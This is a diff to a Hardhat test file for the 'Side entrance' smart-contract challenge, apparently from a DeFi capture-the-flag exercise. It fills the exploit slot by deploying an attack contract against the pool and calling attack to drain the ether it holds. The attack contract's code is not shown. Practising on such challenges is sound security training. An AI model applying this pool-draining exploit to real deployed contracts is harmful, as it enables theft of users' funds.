@@ -1,6 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
+
 describe('[Challenge] Side entrance', function () {
 
     let deployer, attacker;
@@ -25,6 +26,9 @@ describe('[Challenge] Side entrance', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const SideEntranceAttack= await ethers.getContractFactory('AttackSideEntrance', attacker);
+        const attackContract = await SideEntranceAttack.deploy(this.pool.address);
+        attackContract.attack(ETHER_IN_POOL);
     });
 
     after(async function () {
